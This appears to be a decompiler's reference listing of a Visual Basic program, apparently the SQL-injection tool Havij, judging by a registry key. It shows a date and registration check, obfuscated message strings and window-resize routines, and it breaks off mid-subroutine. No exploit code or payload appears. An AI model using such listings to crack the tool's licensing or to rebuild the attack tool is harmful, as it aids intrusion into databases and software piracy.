'N  * ref: Date
'N  * ref: __vbaDateVar
'N  * ref: __vbaDateR8
'N  * ref: __vbaStrDate
'N  * ref: __vbaStrMove
'N  * ref: DateValue(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "Date"
'N  * ref: __vbaStrCopy
'N  * ref: "Software\Havij\Registration"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_754
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "1"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarCopy
'N  * ref: __vbaVarTstEq
'N  * ref: "1234"
'N  * ref: __vbaVarDup
'N  * ref: "h]FF" & Chr$(17) & "^ZWT\@Q" & Chr$(17) & "ZRG" & Chr$(17) & "PVQ_" & Chr$(18) & "VLA[AQU" & Chr$(19)
'N  * ref: __vbaVarDup
'N  * ref: Subr_750
'N  * ref: __vbaStrMove
'N  * ref: MsgBox
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstEq
'N  * ref: "1234"
'N  * ref: __vbaVarDup
'N  * ref: "bK@@T_" & Chr$(19) & "PPFV" & Chr$(20) & "\S]]AG_UE[\Z" & Chr$(17) & "VV@TQGQU" & Chr$(19)
'N  * ref: __vbaVarDup
'N  * ref: Subr_750
'N  * ref: __vbaStrMove
'N  * ref: MsgBox
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaAryDestruct
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFPException
'N  * ref: __vbaErrorOverflow
End Sub
 
'Sub ScaletoDPI()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: _adj_fdiv_m32
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFPException
'End Sub
 
Sub Form_Resize()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaChkstk
'N  * ref: __vbaOnError
'N  * ref: __vbaUI1I2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMove
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarInt
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarInt
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarInt
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarInt
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarInt
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaR4Var
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaR4Var
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarInt
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarInt
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMul
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaUI1I2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarInt
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarForNext
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: _adj_fdiv_m32
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: _adj_fdiv_m32
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaUI1I2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarInt
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaUI1I2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarInt
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaUI1I2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarInt
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaR4Var
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaUI1I2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarInt
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarForNext
'N  * ref: __vbaObjSet
'N  * ref: __vbaUI1I2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDiv
'N  * ref: __vbaVarInt
'N  * ref: __vbaVarAdd
'N  * ref: __vbaR4Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFPException
End Sub
 
Sub Form_Unload(Cancel As Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: "Some jobs are not completed yet, are you sure you want to exit?"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaEnd
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
End Sub
 
Sub Inet_StateChanged(ByVal State As Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaI2I4
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaLateIdCallLd
'N  * ref: "Error ("
'N  * ref: __vbaI4Var
'N  * ref: __vbaStrI4
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: "): "
'N  * ref: __vbaStrVarMove
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
